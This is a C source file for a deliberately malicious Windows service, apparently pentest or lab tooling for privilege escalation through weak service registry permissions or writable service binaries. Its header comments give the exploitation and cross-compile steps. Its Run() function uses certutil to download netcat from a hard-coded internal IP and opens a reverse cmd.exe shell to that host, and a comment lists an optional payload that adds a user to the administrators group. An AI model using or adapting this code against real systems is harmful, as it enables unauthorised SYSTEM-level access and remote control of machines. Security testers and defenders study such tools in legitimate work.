// This is a malicious windows service that can be added 

// Enumerate with: powershell.exe -command "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl" 

// Cross compile with: x86_64-w64-mingw32-gcc windows_service.c -o exploit.exe

/*
 * Exploitation:
 * 	- if the "HKLM\\System\\CurrentControlSet\\Services\\regscv" key is accessible to the low level user:
 * 		- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f
 * 		- sc start <service-name>
 * 	- if a service executable is in a writable directory:
 * 		- compile this service with the same service name as the service being replaced
 * 		- sc start <replaced-service>
 * */

#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

/*
 * Optional Payloads:
 * 	- cmd.exe /k net localgroup administrators user /add
 * 	- whoami > c:\\windows\\temp\\service.txt
 * */

//add the payload here
int Run() 						// make sure the files are being served at the correct addresses
{ 
    system("certutil -urlcache -f http://10.2.5.182:8082/nc64.exe C:\\Temp\\nc64.exe");
    system("C:\\Temp\\nc64.exe -e cmd.exe 10.2.5.182 4445");		// This is the line that executes the malicious command(s)
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "exploit";				// this is the line that names the service
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 


